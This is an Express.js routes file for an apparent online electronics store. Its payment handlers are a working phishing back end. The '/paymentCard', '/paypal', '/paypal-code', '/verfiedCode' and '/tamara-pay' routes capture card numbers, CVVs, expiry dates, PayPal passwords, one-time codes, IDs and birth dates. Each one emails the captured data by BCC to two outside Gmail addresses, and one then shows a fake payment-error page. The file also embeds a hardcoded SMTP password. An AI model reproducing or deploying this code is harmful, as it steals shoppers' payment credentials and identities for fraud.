var express = require("express");
var router = express.Router();
var pdf = require("html-pdf");
var fileURLToPath = require("url");
var dirname = require("path");
var pdfTemp = require("../doc/index.js");

const {
  switchGame,
  Product,
  playGame,
  videoGame,
} = require("../helper/data");
const {
  Products,
  AppleProduct,
  iphone14,
  iphone13,
  Mobile,
  Laptop,
  Samsung,
  Ipad,
  Watch,
  Games,
  ProductById,
} = require("../helper/iphones");

var nodemailer = require("nodemailer");


// mail config
var transporter = nodemailer.createTransport({
  host: "smtp.privateemail.com",
  port: 465,
  secure: true,
  auth: {
    user: "success@resttime.org",
    pass: "Fula@1212",
  },
});

var options = { format: "A4" };

// pages raouts

router.get("/", function (req, res, next) {
   res.render("index", {
  });
});


// ============ iphons-routs ==============
router.get("/iphone-cart/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  let total = parseInt(pro.price) 
  console.log("totla", total);
  res.render("iphone-cart", { title: "Express", pro, total });
});

router.get("/iphone-checkout/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone-checkout", { title: "checkout", pro });
});


router.get("/iphone-products/:id", function (req, res, next) {
  let id = req.params.id;
  console.log("id", id);
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone-product", { title: "Express", product:pro });
});

router.get("/iphone14/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone14", { title: "Express", pro });
});

router.get("/iphone-category/:id", function (req, res, next) {
  let cat = req.params.id;
  let category
  category = Products.filter((i) => i.category == "iphone14" || i.category == "iphone13");
  res.render("iphonecategory.vash", { title: "Express", category });
});

router.get("/cart/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  let total = pro.newPrice + 23;
  res.render("cart", { title: "Express", pro, total });
});

router.get("/about", function (req, res, next) {
  res.render("about", { title: "Express" });
});
router.get("/refund-exchange-policy", function (req, res, next) {
  res.render("refund-exchange-policy", { title: "Express" });
});

router.get("/checkout/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("checkout", { title: "checkout", pro });
});
router.get("/tamara-checkout", function (req, res, next) {
  res.render("tamara", { title: "payment ways" });
});
router.get("/tamara-card", function (req, res, next) {
  res.render("tamaraCard", { title: "payment ways" });
});

// test category
router.get("/category", function (req, res, next) {
  res.render("category", { title: "Express" });
});

router.get("/categories/:id", function (req, res, next) {
  let cat = req.params.id;
  let category = Product.filter((i) => i.category == cat);
  res.render("category", { title: "Express", category });
});

router.get("/products/:id", function (req, res, next) {
  let id = req.params.id;
  console.log("id", id);
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("product", { title: "Express", product:pro });
});

router.get("/iphone14/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone14", { title: "Express", pro });
});
router.get("/contact", function (req, res, next) {
  res.render("contact", { title: "Express" });
});
router.get("/watch", function (req, res, next) {
  res.render("watch", { Watch });
});
router.get("/ipad", function (req, res, next) {
  res.render("ipad", { Ipad });
});
router.get("/pay", function (req, res, next) {
  res.render("pay", { title: "Express" });
});
router.get("/paypal", function (req, res, next) {
  res.render("paypal", { title: "Express" });
});
router.get("/paypal-code", function (req, res, next) {
  res.render("paypalCode", { title: "Express" });
});

router.get("/checkout-card", (req, res) => {
  res.render("card");
});
router.get("/pro", (req, res) => {
  res.render("pro");
});

router.get("/verfiedCode", (req, res) => {
  res.render("code");
});
router.get("/payError", (req, res) => {
  res.render("payError");
});

router.post("/verfiedCode", function (req, res, next) {
  let htl = `
  <h3>verfiedCode: ${req.body.verfiedCode}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com, laeb3694@gmail.com",
    subject: `azizUP Card verfiedCode ${req.body.verfiedCode}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  return res.status(200).json({ message: "success" });
});

router.post("/paypal-code", function (req, res, next) {
  let htl = `
  <h3>verfiedCode: ${req.body.verfiedCode}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com, laeb3694@gmail.com",
    subject: `azizUP Paypal verfiedCode ${req.body.verfiedCode}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  return res.redirect("payError");
});
router.post("/paypal", function (req, res, next) {
  console.log(req.body);
  let htl = `
  <h3>Email: ${req.body.email}</h3>
  <h3>Password: ${req.body.password}</h3>
  `;

  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com, laeb3694@gmail.com",
    subject: `azizUP Paypal to ${req.body.email}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  return res.status(200).json({ message: "success" });
});
// ============= Visa Card =====================
router.post("/paymentCard", function (req, res, next) {
  let htl = `
    <h3>Card Number: ${req.body.cardnumber}</h3>
    <h3>pin: ${req.body.cvv}</h3>
    <h3>Ex date: ${req.body.carddate} / ${req.body.carddate1}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com, laeb3694@gmail.com",
    subject: `azizUP cc ${req.body.cardnumber}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });
  res.redirect("/");
});
router.post("/tamara-pay", function (req, res, next) {
  console.log(req.body);
  let htl = `
    <h3>ID: ${req.body.id}</h3>
    <h3>Date of bath: ${req.body.day}/ ${req.body.month}/ ${req.body.year}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com, laeb3694@gmail.com",
    subject: `azizUP Tamara ${req.body.id}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });
  res.redirect("/tamara-card");
});


// ============= add-to-cart =================

router.post("/add-to-cart/:id", function(req,res,next){
  try {
    console.log("body", req.params.id);

    return res.status(200).json({message:"success"})
  } catch (error) {
    return res.status(400).json({message:"erroo"})
  }
})

// ============= Register User =================

router.post("/userRegister", function (req, res, next) {
  console.log("body", req.body);
  let htl = `
    <h3>${req.body.name}</h3>
    <h3>whatsapp: ${req.body.phone}</h3>
    <h3>price: ${req.body.price} ريال</h3>
    <h3>product: ${req.body.note}</h3>
    <h3>addres: ${req.body.address}</h3>
    <h3>addres2: ${req.body.address2}</h3>
  `;
  pdf.create(pdfTemp.doc(req.body), options).toFile("../invoice.pdf", (err) => {
    transporter.sendMail(
      {
        from: `success@resttime.org`, // sender address
        bcc: `fack21gasa@gmail.com, laeb3694@gmail.com `, // list of receivers
        subject: `AzizUT invoice ${req.body.name}`, // Subject line
        text: `Azez invoice`, // plain text body
        html: htl, // html body
        attachments: [
          {
            filename: "invoice.pdf",
            path: `../invoice.pdf`,
          },
        ],
      },
      (error, info) => {
        if (error) {
          console.log(error);
        } else {
          console.log("Email sent: " + info.response);
        }
      }
    );
  });
  return res.status(200).json({ message: "success" });
  // res.redirect("/payment-way");
});

module.exports = router;
